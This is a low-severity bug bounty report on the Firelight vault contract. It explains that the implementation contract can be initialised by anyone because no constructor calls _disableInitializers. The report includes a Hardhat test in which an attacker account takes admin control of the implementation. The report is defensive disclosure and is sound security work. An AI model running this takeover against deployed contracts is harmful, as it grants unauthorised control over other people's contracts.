# #59371 \[SC-Low] avoid leaving a vault contract uninitialized

**Submitted on Nov 11th 2025 at 16:54:38 UTC by @Flare0x for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight)

* **Report ID:** #59371
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/firelight-protocol/firelight-core/blob/main/contracts/FirelightVault.sol>
* **Impacts:**
  * Smart contract unable to operate due to lack of token funds

## Description

## Brief/Intro

The vault contract has no constructor, which disables the initializer.

## Vulnerability Details

An uninitialized contract can be taken over by an attacker. This applies to both a proxy and its implementation

* contract, which may impact the proxy. To prevent the implementation contract from being used, you should invoke
* the {\_disableInitializers} function in the constructor to automatically lock it when it is deployed:

## Impact Details

An uninitialized contract can be taken over by an attacker.

## References

Include inside the `FirelightVault` contract for safety. constructor() { \_disableInitializers(); }

## Proof of Concept

## Proof of Concept

```javascript
 it('no constructor with _disableInitializer', async () => {
  const attacker = users[2];

  // === 1. Deploy the logic (implementation) contract directly ===
  const Factory = await ethers.getContractFactory('FirelightVault');
  const impl = await Factory.deploy(); // Ethers v6 waits for deployment automatically

  // === 2. Sanity check (just info, not assertion) ===
  const proxyAdminRole = await firelight_vault.DEFAULT_ADMIN_ROLE();
  let proxyAdminFound = false;
  for (const user of users) {
    const hasAdmin = await firelight_vault.hasRole(proxyAdminRole, user.address);
    if (hasAdmin) {
      console.log('Existing admin on proxy:', user.address);
      proxyAdminFound = true;
    }
  }
  if (!proxyAdminFound) console.log('⚠️ No admin found on proxy (fixture may use another deployer)');

  // === 3. Prepare initialize() params for the implementation ===
  const initParamsTypes = [
    'address', // defaultAdmin
    'address', // limitUpdater
    'address', // blocklister
    'address', // pauser
    'address', // periodConfigurationUpdater
    'uint256', // depositLimit
    'uint48'   // periodConfigurationDuration
  ];

  const depositLimit = ethers.parseUnits('1000', DECIMALS);
  const periodDuration = 86400; // 1 day

  // encode using ethers v6 ABI coder
  const abiCoder = ethers.AbiCoder.defaultAbiCoder();
  const initParamsEncoded = abiCoder.encode(initParamsTypes, [
    attacker.address, // make attacker the admin
    ethers.ZeroAddress,
    ethers.ZeroAddress,
    ethers.ZeroAddress,
    ethers.ZeroAddress,
    depositLimit,
    periodDuration
  ]);

  // === 4. Attacker calls initialize on implementation (which should NOT be possible if _disableInitializers() existed) ===
  await expect(
    impl.connect(attacker).initialize(token_contract.target, 'ImplVault', 'iVAULT', initParamsEncoded)
  ).to.not.be.reverted;

  // === 5. Verify the attacker now owns the implementation contract ===
  const DEFAULT_ADMIN = await impl.DEFAULT_ADMIN_ROLE();
  const isAttackerAdmin = await impl.hasRole(DEFAULT_ADMIN, attacker.address);
  expect(isAttackerAdmin).to.equal(true);

  // === 6. Show that attacker can grant themselves another role ===
  const DEPOSIT_LIMIT_ROLE = await impl.DEPOSIT_LIMIT_UPDATE_ROLE();
  await impl.connect(attacker).grantRole(DEPOSIT_LIMIT_ROLE, attacker.address);
  const hasDepositLimitRole = await impl.hasRole(DEPOSIT_LIMIT_ROLE, attacker.address);
  expect(hasDepositLimitRole).to.equal(true);

  console.log('\n✅ Exploit Successful: Attacker initialized unprotected implementation contract and took admin control.\n');
});
```
